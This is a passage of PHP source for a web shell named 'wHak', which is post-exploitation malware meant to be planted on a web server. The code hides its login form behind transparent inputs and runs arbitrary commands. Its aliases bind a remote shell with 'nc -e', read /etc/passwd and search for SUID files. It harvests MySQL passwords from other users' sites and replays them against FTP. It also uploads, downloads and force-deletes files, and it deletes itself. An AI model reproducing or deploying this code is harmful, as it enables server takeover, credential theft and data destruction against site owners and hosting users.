        if(isset($_SERVER['REMOTE_ADDR']) === false){
            $this->cli = true;
            $this->Session['logged_in'] = true;
            $mode = 'shell';
        } else {

            if($this->logged_in() === false){
                if($_SERVER['REQUEST_METHOD'] === 'POST'){
                    if($this->log_in($_POST['user'], $_POST['pass'])){
                        $this->Session['logged_in'] = true;
                        header('Location: '. $_SERVER['PHP_SELF']);
                        exit;
                    }
                }
                ?>
                <form action="" method="post">
                    <input type="text" name="user" style="border: none; background: transparent;"/>
                    <input type="password" name="pass" style="border: none; background: transparent;" />
                    <input type="submit" value="" style="border: none; background: transparent;" />
                </form>
                <?php
                exit;
            }
            $mode = 'action_'.(isset($_GET['m']) ? $_GET['m'] : 'content');
        }

        $this->Aliases = array(
            'll'  => array(
                'type' => 'alias',
                'description' => 'A better ls',
                'cmd' => 'ls -lah',
            ),
            'fsh' => array(
                'type' => 'alias',
                'description' => 'Find users with shell access',
                'cmd' => 'cat /etc/passwd | grep -vE "nologin|noshell|false"',
            ),
            'fdbc' => array(
                'type' => 'function',
                'description' => 'Find db credientials',
                'cmd' => 'find_db_passwords'
            ),
            'fadbc' => array(
                'type' => 'function',
                'description' => 'Find all db credientials',
                'cmd' => 'find_all_db_passwords'
            ),
            'faf' => array(
                'type' => 'function',
                'description' => 'Find all valid ftp credientials from mysql connections',
                'cmd' => 'find_all_ftp'
            ),
            '?' => array(
                'type' => 'function',
                'description' => 'Displays this help message',
                'cmd' => 'help'
            ),
            'fsuid' => array(
                'type'=>'alias',
                'description' => 'find all suid files',
                'cmd' => 'find / -type f -perm -04000 -ls | grep -v "Permission Denied"'
            ),
            'fsuid -r' => array(
                'type'=>'alias',
                'description' => 'find all suid files recursive from current dir',
                'cmd' => 'find . -type f -perm -04000 -ls | grep -v "Permission Denied"'
            ),
            'fsgid' => array(
                'type'=>'alias',
                'description' => 'find all sgid files',
                'cmd' => 'find / -type f -perm -02000 -ls | grep -v "Permission Denied"'
            ),
            'fsgid -r' => array(
                'type'=>'alias',
                'description' => 'find all sgid files recursive from current dir',
                'cmd' => 'find . -type f -perm -02000 -ls | grep -v "Permission Denied"'
            ),
            'sop' => array(
                'type'=>'alias',
                'description' => 'Show open ports',
                'cmd' => 'netstat -an | grep -i listen'
            ),
            'brsh' => array(
                'type'=>'alias',
                'description' => 'Bind a remote shell: brsh [port]',
                'cmd' => "echo '#!{$this->Session['php_path']}\n<?php\nrequire \"". __FILE__ ."\";' > tmp_123 && chmod 755 tmp_123 && nc -e tmp_123 -l -p",
                'default_args' => array(1986)
            ),
            'frhd' => array(
                'type'=>'function',
                'description' => 'Find readable Home Directories',
                'cmd' => "find_readable_home_dir"
            )
        );




        #---- DO NOT REMOVE: START
/*        if ($handle = opendir(WH_CONTENT_DIR)) {
            while (false !== ($file = readdir($handle))) {
                if($file != '.' && $file != '..' && is_file(WH_CONTENT_DIR.$file)){
                    $this->Content[$file] = base64_encode(file_get_contents(WH_CONTENT_DIR.$file));
                }
            }
            closedir($handle);
        }
        #---- DO NOT REMOVE: END
*/
        if(method_exists($this, $mode)){
            $this->$mode();
        } else {
            die('not found');
        }
    }

    function logged_in(){
        return $this->Session['logged_in'];
    }

    function log_in($user, $password){
        return ($user === WH_USER && strcmp(sha1($password), WH_PASS) === 0);
    }

    function get_prompt(){
        return $this->Session['whoami'].'@'. $this->Session['server_name'] .':'.$this->Session['cwd'] .'$';
    }

    function shell(){
        $this->shell_listen();
    }
    function shell_output($text){
        fwrite(STDOUT, $text);
    }

    function shell_listen(){
        $this->shell_output($this->get_prompt().' ');
        $cmd = fgets(STDIN);
        $this->action_cmd(trim($cmd));
        $this->shell_listen();
    }

    function exec_cmd($cmd){
        $handle = popen($cmd.' 2>&1', 'r');
        $line = '';
        while(!feof($handle)){
            $line .= fread($handle, 2096);
        }
        pclose($handle);
        return $line;
    }

    /**
     * php 4 doesn't support file_put_contents
     */
    function file_put_contents($file, $contents, $append=false){
        $mode = ($append) ? 'a' : 'w';
        $file_handle = fopen($file, $mode);
        fwrite($file_handle, $contents);
        fclose($file_handle);
    }

    function get_note_html(){
        $html = '';
        foreach($this->Session['notes'] as $k =>$v){
            $time = date('g:ia', $v['time']);
            $note = htmlentities($v['note'], ENT_QUOTES);
            $html .= <<<EOF
            <div class="note">
                <span class="options">
                    <a href="?m=remove_note&amp;i={$k}" class="ajax icon note_delete" update="server-notes">X</a>
                    <span class="clear"></span>
                </span>
                <span class="contents">$note</span>
            </div>
EOF;

        }
        return $html;
    }

    function add_note($note, $type='note'){
        $time = time();
        array_push($this->Session['notes'], array( 'type' => $type, 'time' => $time, 'note' => $note));
        $this->Session['last_note'] = $time;
    }

    function remove_note($index){
        unset($this->Session['notes'][$index]);

        $notes = $this->Session['notes'];

        $this->Session['notes'] = array();
        foreach($notes as $v){
            $this->Session['notes'][] = $v;
        }
    }

    function find_var($var){
        $ret = false;
        $in_line = array("'",'"');
        $var = str_replace('$', '', $var);
        $var = preg_replace('/([\'\"\[\]])/', '\\\${1}', ($var));
        $tmp_regex = "{$var}[\s]*\=(.+);";

        $cmd="grep -hrPo \"{$tmp_regex}\" ".getcwd() ." | grep -v .svn";
        $res = $this->exec_cmd($cmd);
        $tm = array();
        preg_match_all("/$tmp_regex/", $res, $tm);
        if(isset($tm[1])){
            foreach($tm[1] as $v){
                $v = trim($v);
                $fc = substr($v, 0, 1);
                $lc = substr($v, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    $ret = substr($v, 1, -1);
                } else if(preg_match("/\$/", $v)){
                    // variable
                    $ret = $this->find_var($v);
                } else {
                    //define
                    $ret = $this->find_define($v);
                }
                if($ret !== false){
                    break;
                }
            }
        }
        return $ret;
    }

    function find_define($var){
        $ret = false;$in_line = array("'",'"');
        $matches = array();


        $tmp_regex = 'define\([\\\'\"]?'. $var .'[\\\'|\"]?\s*\,\s*([\\\'\"].+[\\\'\"])\);';
        $cmd="grep -hrPo \"{$tmp_regex}\" ".getcwd() ." | grep -v .svn";
        $res = $this->exec_cmd($cmd);
        $tm = array();
        preg_match_all("/$tmp_regex/", $res, $tm);
        if(isset($tm[1])){
            foreach($tm[1] as $v){
                $v = trim($v);
                $fc = substr($v, 0, 1);
                $lc = substr($v, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    $ret = substr($v, 1, -1);
                } else if(preg_match("/\$/", $v)){
                    // variable
                    $ret = $this->find_var($v);
                } else {
                    //define
                    $ret = $this->find_define($v);
                }
                if($ret !== false){
                    break;
                }
            }
        }

        return $ret;
    }

    /**
     * currently only mysql
     */
    function find_db_passwords ($dir = ""){
        set_time_limit(0);
        $order = array('host', 'user', 'pass');
        $in_line = array("'",'"');
        $ignore = array(
            'false'
        );
        $vars_found = array();
        if(empty($dir)){
        	chdir($this->Session['cwd']);
        }else{
        	chdir($dir);
        }

        $res = $this->exec_cmd("grep -rE mysqli?_p?connect ".getcwd() ." | grep -v .svn");
        $matches = array();
        preg_match_all("/mysqli?_p?connect\((.+?),\s?(.+?),\s?(.+?)[,|\)]/",$res, $matches);
        $Info = array (
            'host' => $matches[1],
            'user' => $matches[2],
            'pass' => $matches[3],
        );
        $Found = array();
        $tFound = array();
        $regex = '';

        foreach($Info['host'] as $k => $v){
            $tmpData = array(
                'host'  => $v,
                'user'  => $Info['user'][$k],
                'pass'  => $Info['pass'][$k]
            );
            $tFound[] = $tmpData;
        }

        foreach($tFound as $k => $data){

            foreach($data as $kt => $us){
                $us = trim($us);
                $fc = substr($us, 0, 1);
                $lc = substr($us, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    // inline
                    $us = substr($us, 1, -1);

                } else if(preg_match('/\$/', $us)){
                    // variable
                    $us = $this->find_var($us);
                } else {
                    //define
                    $us = $this->find_define($us);
                }
                $data[$kt] = $us;
            }

            if($data['host'] !== false &&
               $data['user'] !== false &&
               $data['pass'] !== false){
                $Found[] = $data;
            }
        }

        $Found = array_unique($Found);
        var_dump($Found);
        foreach($Found as $data){
          $this->add_note(serialize($data), 'mysql_dbc');
        }

    }

    function find_all_db_passwords(){
		$passwd = file('/etc/passwd');

        foreach($passwd as $key => $val){
            if(strpos($val,"/home")){
                $str = explode(":",$val);
                if(is_readable($str['5']."/public_html/")){
                    $valid[] = $str['5']."/public_html/";
                }
            }
        }

        foreach($valid as $key => $val){
            $results[] = $this->find_db_passwords($val);
        }

        chdir($this->Session['cwd']);

    }

    function find_readable_home_dir(){
    	$passwd = file('/etc/passwd');

        foreach($passwd as $key => $val){
            if(strpos($val,"/home")){
                $str = explode(":",$val);
                if(is_readable($str['5']."/public_html/")){
                    $valid[] = $str['5']."/public_html/";
                }
            }
        }

        $output .= "################################# \n";
        foreach($valid as $key => $val){
            $output .= "## {$val}\n";;
        }
        $output .= "################################# \n";

        print $output;
    }

    function find_all_ftp(){

        $host = "127.0.0.1";

        foreach($this->Session['notes'] as $k =>$v){
            if($v['type'] === "mysql_dbc"){
                $info = unserialize($v['note']);
                $user = explode("_",$info['user']);
                $info['user'] = $user['0'];

                @$conn = ftp_connect($host);
                if($conn){
                    $ftp = ftp_login($conn,$info['user'],$info['pass']);
                    if($ftp){
                        $success[] = $info;
                    }

                    @ftp_quit($ftp);
                }
            }
        }

        $total = count($success);
        $count = 0;
        echo "################################ <br>";
        if($total > 0){
          foreach($success as $info){
            $count++;
            echo "## <br>";
            echo "## Username: {$info['user']}<br>";
            echo "## Password: {$info['pass']}<br>";
            if($count !== $total){
              echo "## _______________________________<br>";
            }

          }
        }else{
          echo "##  No FTP Accounts found <br>";
        }
        echo "################################ <br>";
    }

    /**
     * thank you webmaster at askapache dot com
     */
    function stat($file) {

        clearstatcache();
        $ss=@stat($file);
        if(!$ss) return false; //Couldnt stat file

        $ts=array(
            0140000=>'ssocket',
            0120000=>'llink',
            0100000=>'-file',
            0060000=>'bblock',
            0040000=>'ddir',
            0020000=>'cchar',
            0010000=>'pfifo'
        );

        $p=$ss['mode'];
        $t=decoct($ss['mode'] & 0170000); // File Encoding Bit

        $str =(array_key_exists(octdec($t),$ts))?$ts[octdec($t)]{0}:'u';
        $str.=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-');
        $str.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
        $str.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-');
        $str.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
        $str.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-');
        $str.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));

        $s=array(
            'perms'=>array(
                'umask'=>sprintf("%04o",@umask()),
                'human'=>$str,
                'octal1'=>sprintf("%o", ($ss['mode'] & 000777)),
                'octal2'=>sprintf("0%o", 0777 & $p),
                'decimal'=>sprintf("%04o", $p),
                'fileperms'=>@fileperms($file),
                'mode1'=>$p,
                'mode2'=>$ss['mode']),

            'owner'=>array(
                'fileowner'=>$ss['uid'],
                'filegroup'=>$ss['gid'],
                'owner'=> (function_exists('posix_getpwuid'))?
                    @posix_getpwuid($ss['uid']):'',
                'group'=> (function_exists('posix_getgrgid'))?
                    @posix_getgrgid($ss['gid']):''
            ),

            'file'=>array(
                'filename'=>$file,
                'realpath'=>(@realpath($file) != $file) ? @realpath($file) : '',
                'dirname'=>@dirname($file),
                'basename'=>@basename($fil/e)
            ),

            'filetype'=>array(
                'type'=>substr($ts[octdec($t)],1),
                'type_octal'=>sprintf("%07o", octdec($t)),
                'is_file'=>@is_file($file),
                'is_dir'=>@is_dir($file),
                'is_link'=>@is_link($file),
                'is_readable'=> @is_readable($file),
                'is_writable'=> @is_writable($file)
            ),

            'device'=>array(
                'device'=>$ss['dev'], //Device
                'device_number'=>$ss['rdev'], //Device number, if device.
                'inode'=>$ss['ino'], //File serial number
                'link_count'=>$ss['nlink'], //link count
               // 'link_to'=>($s['type']=='link') ? @readlink($file) : ''
            ),

            'size'=>array(
                'size'=>$ss['size'], //Size of file, in bytes.
                'blocks'=>$ss['blocks'], //Number 512-byte blocks allocated
                'block_size'=> $ss['blksize'] //Optimal block size for I/O.
            ),

            'time'=>array(
                'mtime'=>$ss['mtime'], //Time of last modification
                'atime'=>$ss['atime'], //Time of last access.
                'ctime'=>$ss['ctime'], //Time of last status change
                'accessed'=>@date('Y M D H:i:s',$ss['atime']),
                'modified'=>@date('Y M D H:i:s',$ss['mtime']),
                'created'=>@date('Y M D H:i:s',$ss['ctime'])
            ),
        );

        clearstatcache();
        return $s;
    }

    function bytes_to_human($bytes) {
        $size = $bytes / 1024;
        if($size < 1024) {
            $size = number_format($size, 2);
            $size .= ' KB';
        } else {
            if($size / 1024 < 1024) {
                $size = number_format($size / 1024, 2);
                $size .= ' MB';
            } else if ($size / 1024 / 1024 < 1024) {
                $size = number_format($size / 1024 / 1024, 2);
                $size .= ' GB';
            }
        }
        return $size;
    }

    function ls($dir){
        $dir = (substr($dir, -1) === '/') ? $dir : $dir .'/';
        if ($dir_handle = opendir($dir)) {
            $files = array();
            while (false !== ($file = readdir($dir_handle))) {
                $stat = $this->stat($dir . $file);
                if($stat){
                    $files[$file] = array(
                        'type'  => $stat['filetype']['type'],
                        'perms' => $stat['perms']['human'],
                        'readable' => $stat['filetype']['is_readable'],
                        'writable' => $stat['filetype']['is_writable'],
                        'owner_id' => $stat['owner']['fileowner'],
                        'group_id' => $stat['owner']['filegroup'],
                        'owner_name' => $stat['owner']['owner']['name'],
                        'group_name' => $stat['owner']['group']['name'],
                        'size_human' => $this->bytes_to_human($stat['size']['size']),
                        'accessed'=>$stat['time']['accessed'],
                        'modified'=>$stat['time']['modified'],
                        'created'=>$stat['time']['created'],
                        'realpath' => $stat['file']['dirname'] .'/'.$stat['file']['basename']
                    );
                } else {
                    $files[$file] = array();
                }
            }
            closedir($dir_handle);
            ksort($files);
            return $files;
        }
        return false;
    }

    function help(){
        ksort($this->Aliases);
        $out = "
    ################################
    ## wHak ". WH_VERSION ."
    ##\n";
        foreach($this->Aliases as $cmd => $v){
            $out .= "    ##    ". str_pad($cmd, 15, ' ')." {$v['description']}\n";
        }

        $out .= "    ##
    ################################\n";
        return $out;
    }

    #########################
    ## Actions Below Here
    #########################


    function action_content(){
        $object = isset($_GET['o']) ? $_GET['o'] : 'main.html';
        if(isset($this->Content[$object])){
            $ext = preg_replace('/^.*?([a-zA-Z0-9]*)$/', '$1', $object);
            switch($ext){
                case 'css':
                    header('Content-type: text/css');
                    print base64_decode($this->Content[$object]);
                    break;
                case 'js':
                    header('Content-type: text/javascript');
                    print base64_decode($this->Content[$object]);
                    break;
                default:
                    eval(base64_decode($this->Content[$object]));
                    break;
            }
        }
    }

    function action_info() {
        $safe_mode = in_array(ini_get('safe_mode'), array(1, 'on'));
        $info = array(
            'name' => $this->Session['uname'],
            'whoami' => $this->Session['whoami'],
            'prompt' => $this->get_prompt(),
            'time' =>date('Y-m-d H:i:s'),
            'uptime' => trim(`uptime`),
            'last_note' => $this->Session['last_note'],
            'php_version' => "<span title='".PHP_VERSION." Safe mode is ". ($safe_mode ? 'ON':'OFF') ."' style='color:#". ($safe_mode ? '0f0':'f99') ."'>".PHP_VERSION."</span>",
        );

        header('Content-type: text/xml');
        print '<?xml version="1.0" encoding="UTF-8"?>';
        print "<status>";

        print '<server ';
        foreach($info as $k => $v){
            print "$k=\"". htmlentities($v) ."\" ";
        }
        print ' />';
        print "</status>";
    }

    function action_file_browser_cd(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            chdir($_GET['path']);
            $this->Session['cwd'] = getcwd();
            $this->action_ls();
        }
    }

    function action_file_browser_view(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $ext = preg_replace('/^.*?([a-zA-Z0-9]*)$/', '$1', $_GET['path']);
            switch($ext){
                case 'php':
                    highlight_file($_GET['path']);
                    break;
                default:
                    echo htmlentities(file_get_contents($_GET['path']), ENT_QUOTES);
                    break;
            }
        }
    }

    function action_file_browser_dl(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $filename = basename($_GET['path']);
            if(is_dir($_GET['path'])){
                $tmp_dir = sys_get_temp_dir();
                $filename = $tmp_dir .'/'. $filename .'.tgz';
                $this->exec_cmd('tar -czvf "'.$filename.'" "'. $_GET['path'] .'"');
                header('Content-type: application/x-gzip');
                header('Content-Disposition: attachment; filename="'. $filename .'.tgz"');
                readfile('/tmp/'. $filename .'.tgz');
            } else {
                //header('Content-type: application/x-gzip');
                header('Content-Disposition: attachment; filename="'. $filename .'"');
                readfile($_GET['path']);
            }
            exit;
        }
    }

    function action_file_browser_rm(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $r = $this->exec_cmd('rm -rf "'. $_GET['path'] .'"');
            $this->action_ls();
        }
    }

    function action_file_browser_upload(){
        chdir($this->Session['cwd']);
        $target_path = basename($_FILES['uploadedfile']['name']);
        move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
    }

    function action_ls(){

        $file_list = $this->ls($this->Session['cwd']);
        print "<form id='file-upload' target='iframe-hack' action='?m=file_browser_upload' method='post' enctype='multipart/form-data'>
                <input name='uploadedfile' type='file' /><input type='submit' value='Upload File' /></form>";

        print "<h2>".htmlentities($this->Session['cwd'], ENT_QUOTES)."</h2>";
        print "<div id='file-contents'></div>";
        print "<table class='file-list'>";

        $keys = array(
            'perms',
            'owner_id',
            'group_id',
            'owner_name',
            'group_name',
            'size_human',
            'accessed',
            'modified',
            'created'
        );

        foreach($file_list as $filename => $data){
            print '<tr>';
            switch($data['type']){
                case 'dir':
            print '<td class="options">
            <a class="icon file_folder_down" href="?m=file_browser_dl&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon file_folder_delete" update="file-section" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <!--a class="icon file_edit" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a-->
            </td>';
                    print '<td><a update="file-section" class="ajax" href="?m=file_browser_cd&path='. base64_encode($data['realpath'] . $filename) .'">'. htmlentities($filename, ENT_QUOTES) .'</a></td>';
                    break;
                case 'file':
            print '<td class="options">
            <a class="icon file_down" href="?m=file_browser_dl&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon file_delete" update="file-section" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon note_add" href="?m=add_note&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <!--a class="icon file_edit" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a-->
            </td>';
                    print '<td><a update="file-contents" class="ajax" href="?m=file_browser_view&path='. base64_encode($data['realpath'] . $filename) .'">'. htmlentities($filename, ENT_QUOTES) .'</a></td>';
                    break;
            }

//            var_dump($data);
            foreach($keys as $k){ //$data as $d){
                print '<td>'.htmlentities($data[$k], ENT_QUOTES).'</td>';
            }
            print '</tr>';
        }
        print '</table>';
    }

    function action_cmd($cmd=false){
        $cmd = $cmd ? trim($cmd) : trim(stripslashes($_POST['cmd']));
        if(empty($cmd)){
            return;
        }

        $capture_output = preg_match("/^:/", $cmd);
        if($capture_output){
            $cmd = preg_replace("/^:/", '', $cmd);
        }


        $Alias = array(
            'type'=>'cmd',
            'cmd' => $cmd
        );

        if(strpos($cmd, ' ') !== false){
            $cmd_ar = explode(' ', $cmd);
        }

        if(key_exists($cmd, $this->Aliases)){
            $Alias = $this->Aliases[$cmd];
        } else if(isset($cmd_ar) && key_exists($cmd_ar[0], $this->Aliases)){
            $Alias = $this->Aliases[$cmd_ar[0]];
        }

        chdir($this->Session['cwd']);
        if($this->cli === false){
            echo $this->get_prompt().' '. htmlentities($cmd) . "\n";
        }
        switch($Alias['type']){
            case 'function':
                $response = (method_exists($this, $Alias['cmd'])) ? call_user_method($Alias['cmd'], $this) : '';
                break;
            default:
                if($Alias['cmd'] != $cmd && (isset($cmd_ar) || isset($Alias['default_args']))){

                    $arg_ar = array();
                    if(isset($Alias['default_args'])){
                        $arg_ar = array_merge($arg_ar, $Alias['default_args']);
                    }

                    if(isset($cmd_ar)){
                        array_shift($cmd_ar);
                        $arg_ar = array_merge($arg_ar, $cmd_ar);
                    }
                    $args = implode(' ', $arg_ar);
                    $Alias['cmd'] .= " $args";
                }

                $response = $this->exec_cmd($Alias['cmd']);
                break;
        }

        if($capture_output){
            $this->add_note("CAPTURED--\n{$response}");
        }
        print htmlentities($response);

        $mat=array();
        if(preg_match_all("/^cd (.*)/", $cmd, $mat)){
            chdir($mat[1][0]);
            $this->Session['cwd'] = getcwd();
        }
    }

    function action_get_notes(){
        print $this->get_note_html();
    }

    function action_add_note(){
        if(isset($_POST['notes'])){
            $this->add_note($_POST['notes']);
            print $this->get_note_html();
        } else if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            if(is_file($_GET['path'])){
                $this->add_note(serialize(array('file_name' => basename($_GET['path']), 'contents' => file_get_contents($_GET['path']))), 'file');
            }
        }
    }

    function action_remove_note(){
        $this->remove_note($_GET['i']);
        print $this->get_note_html();
    }


    function action_clean_up (){
        if(is_dir(WH_CONTENT_DIR)){
            $rm = "rm -rf ".WH_CONTENT_DIR;
            `{$rm}`;
        }
        unlink(__FILE__);
        die('House keeping');
    }

    function action_dl(){
        if(WH_STATUS === 'EXTRACTED'){
            $_GET['dl']=true;
            $this->action_compile();
        } else {
            header('Content-Disposition: attachment; filename="whak.'. strtolower(str_replace(' ', '', WH_VERSION)) .'.php"');
            readfile(__FILE__);
            exit;

        }
    }

    function action_dl_notes($content = "", $file = false){
        if((empty($content))&&(!$file)){
            $types = array();
            foreach($this->Session['notes'] as $k => $v){
                if(isset($types[$v['type']]) === false){
                    $types[$v['type']] =array();
                }
                $types[$v['type']][] = $k;
            }
            $tmp_dir      = sys_get_temp_dir();
            $old_cwd      = $this->Session['cwd'];
            $notes_folder = 'whak_notes('. $this->Session['server_name'] .')';
            $notes_path   = $tmp_dir .'/'.$notes_folder .'/';
            mkdir($notes_path);
            chdir($notes_path);
            $this->Session['cwd'] = $tmp_dir;

            foreach($types as $type => $keys){
                switch($type){
                    case 'note':
                    case 'mysql_dbc':
                        foreach($keys as $k){
                            $tmp = $this->Session['notes'][$k];
                            $this->file_put_contents($notes_path.$type, date('Y-m-d H:i:s', $tmp['time']) ."\n{$tmp['note']}\n\n", true);
                        }
                        break;
                    case 'file':
                        foreach($keys as $k){
                            $tmp = unserialize($this->Session['notes'][$k]['note']);
                            $tmp_file = $notes_path.$tmp['file_name'];
                            $i=1;
                            while(file_exists($tmp_file)){
                                $tmp_file = $notes_path.$tmp['file_name']."{$i}";
                                ++$i;
                            }
                            $this->file_put_contents($tmp_file, $tmp['contents']);
                        }
                        break;
                }
            }
            chdir($tmp_dir);
            $notes_tar = $notes_folder.'.tgz';
            $this->exec_cmd('tar -czvf "'.$notes_tar .'" "'.$notes_folder.'"');

            header('Content-type: application/x-gzip');
            header('Content-Disposition: attachment; filename="'. $notes_tar .'"');
            readfile($notes_tar);

            $this->exec_cmd('rm -rf "'. $notes_tar .'"');
            $this->exec_cmd('rm -rf "'. $tmp_dir .'"');
            $this->Session['cwd'] = $old_cwd;

/*
            foreach($this->Session['notes'] as $k =>$v){

                $time = date('m/d/Y g:ia', $v['time']);
                $note = htmlentities($v['note'], ENT_QUOTES);
                $content .= $time . " \r\n";
                $content .= $note . " \r\n";
            }
        }
        if($file){
            header('Content-Disposition: attachment; filename="whak_'. basename($content));
            readfile($content);
            exit;
        } else {
            if(!empty($content)){
                header('Content-Disposition: attachment; filename="whak_n_'. $this->Session['whoami'].'@'. $_SERVER['HTTP_HOST'] .'.txt');
                print $content;
                exit;
            } else {
                die("you cant do that");
            }*/
        }

    }

    function action_change_pass(){
        if(isset($_POST['pass'])){

        }
    }

    function action_logout(){
        session_destroy();
        die('thanks for playing');
    }

    function action_compile(){
        $file = file_get_contents(__FILE__);
        if(WH_STATUS === 'EXTRACTED'){
            $file = preg_replace("/'WH_STATUS',      'EXTRACTED'/", "'WH_STATUS',      'COMPILED'", $file, 1);

            ob_start();
            print '    var $Content = ';
            var_export($this->Content);
            print ';';
            $c = ob_get_contents();
            ob_end_clean();

            $find = array(
                "/#-{4} DO NOT REMOVE: START\n/",
                "/#-{4} DO NOT REMOVE: END\n/",
                '/\s{4}#{4}-{4}\n\s{4}var \$Content = array\(\);\n\s{4}#{4}-{4}/'
            );

            $replace = array(
                "#---- DO NOT REMOVE: START\n/*",
                "#---- DO NOT REMOVE: END\n*/",
                "    ####----\n{$c}\n    ####----"
            );

            $file = preg_replace($find, $replace, $file);
            if(isset($_GET['dl'])){
                header('Content-Disposition: attachment; filename="whak.'. strtolower(str_replace(' ', '', WH_VERSION)) .'.php"');
                print $file;
                exit;
            }

            whak::file_put_contents(__FILE__, $file);
            header('Location: '. $_SERVER['PHP_SELF']);
            exit;
        } else {
            die('you cant do that');
        }
    }

    function action_extract(){
        $file = file_get_contents(__FILE__);
        if(WH_STATUS === 'COMPILED'){
            $file = preg_replace("/'WH_STATUS',      'COMPILED'/", "'WH_STATUS',      'EXTRACTED'", $file, 1);
            if(!is_dir(WH_CONTENT_DIR)){
                if(!mkdir(WH_CONTENT_DIR)){
                    die("Can't Extract");
                }
            }

            foreach($this->Content as $file_name => $contents){
                file_put_contents(WH_CONTENT_DIR.$file_name, base64_decode($contents));
            }

            $find = array(
                "/#-{4} DO NOT REMOVE: START\n\/\*/",
                "/#-{4} DO NOT REMOVE: END\n\*\//",
                "/\s{4}#{4}-{4}\n[.\s\S]*?\s{4}#{4}-{4}/"
            );

            $replace = array(
                "#---- DO NOT REMOVE: START\n",
                "#---- DO NOT REMOVE: END\n",
                "    ####----\n    var \$Content = array();\n    ####----"
            );

            $file = preg_replace($find, $replace, $file);
            whak::file_put_contents(__FILE__, $file);
            header('Location: '. $_SERVER['PHP_SELF']);
            exit;
        } else {
            die('you cant do that');
        }
    }

    function action_mysql($get = ""){
	if($get == "") {
	  $get = $_GET;
	}
		$this->mysql->notes = $this->Session['notes'];
    	print $this->mysql->viewDisplay($get);
    }
}


/**
 *
 * MYSQL TO DO
 *
 * Fix POST Updates / Deletes
 * Add way to add custom mysql connections through notes manager
 * Fix SQL Query box
 * Fix mysql not seeing connections at first load
 *
 */
class mysql {
    var $dbhost;
    var $dbinfo;
    var $dbpass;
    var $dbname;
    var $conn;
    var $db;
    var $query;
    var $results;
    var $tquery = 0; # not needed and has a bug
    var $queries;
    var $tbl = array();
    var $limit = " LIMIT 30";
    var $file;
    var $current;
    var $noWorkie;

    // Connection and primary DB queries
    function mysql($notes = array()){
        $this->dbhost = "localhost";
        $this->notes = $notes;
        $this->file = basename($_SERVER['SCRIPT_FILENAME']);
        $this->current = (isset($_GET['current']) ? $_GET['current'] : 0);
        $this->dbinfo = array();

        if(count($this->notes) > 0){
        	$this->load();
        	if(count($this->dbinfo) > 0){
            	$this->conn = mysql_connect($this->dbhost, $this->dbinfo[$this->current]['user'], $this->dbinfo[$this->current]['pass']);

				if($_GET['db']){
				    $this->dbname = base64_decode($_GET['db']);
				    $this->db = mysql_select_db($this->dbname,$this->conn);
				}
		    }
        }
    }

    function load(){
        $count = 0;

        foreach($this->notes as $k =>$v){
            if($v['type'] === "mysql_dbc"){
                $info = unserialize($v['note']);
                if($info['user'] !== "" && $info['pass'] !== ""){
                     $testCon = @mysql_connect($this->dbhost, $info['user'], $info['pass']);
                     if($testCon){
                         $this->dbinfo[$count]['user'] = $info['user'];
                         $this->dbinfo[$count]['pass'] = $info['pass'];

                         $count++;
                     }
                }
            }
        }
    }

    function query($query, $results = 1){
        $this->queries[(count($this->queries) + 1)]["query"] = $query;
        if($results){
            $this->query = $query;
            $this->results = @mysql_query($query, $this->conn);
        }else{
            $query = ($query ? $query : $this->query);
            mysql_query($query, $this->conn);
        }

        if(mysql_error()){
            return $this->error($query, mysql_error());
        }else{
            if($this->tquery){
                $this->describe($query);
            }
            return $this->results;
        }
    }

    function numRows($query = ""){
        return mysql_num_rows($this->query($query,"0"));
    }

    function describe($query){
        if(!preg_match("/^show/",strtolower($query))){
            $count = (count($this->queries) + 1);
            if(substr($query, 0, 9) !== "DESCRIBE "){
                $this->queries[$count]["describe"] = "DESCRIBE ". $query;
            }
        }
    }

    function fetch($query){
        return mysql_fetch_assoc($this->query($query));
    }

    function getArray($query){

        $this->query($query);
        while($row = mysql_fetch_assoc($this->results)){
            $results[] = $row;
        }

        foreach($results as $k => $v){
            $arr[] = $v;
        }

        return $this->getReturn($arr);

    }

    function getReturn($item){
        if(is_array($item)){
            $arr = array();
            foreach($item as $k => $v){
	            $arr[$k] = $this->getReturn($v);
            }
            return $arr;
        }else{
            return htmlentities(stripslashes($item));
        }
    }

    function escape($item){
        if(is_array($item)){
            $arr = array();
            foreach($item as $key => $val){
                    $arr[$k] = $this->escape($val);
            }
            return $arr;
        }else{
            return mysql_real_escape_string($item, $this->conn);
        }
        return $item;
    }

    // error tracking / helping
    function display($item){
        print "<pre>";
        print_r($this->getReturn($item));
        print "</pre>";
    }

    function error($query, $error){
        print("<br>QUERY: '{$query}'");
        print("<br>ERROR: " . $error);
    }

    function validTbl($tbl){
//         if(in_array($tbl,$this->tbl)){
            return true;
//         }else{
//             $this->error("INVALID TABLE","CHECK YO SELF");
//             return false;
//         }
    }

    // for database
    function getdbs(){
        $db_list = $this->query("SHOW DATABASES");

        if($db_list){
		    while ($row = mysql_fetch_assoc($db_list)) {
		        $db[] =  $row['Database'];
		    }
        }

        return $this->getReturn($db);
    }

    // list all databases this user has access to
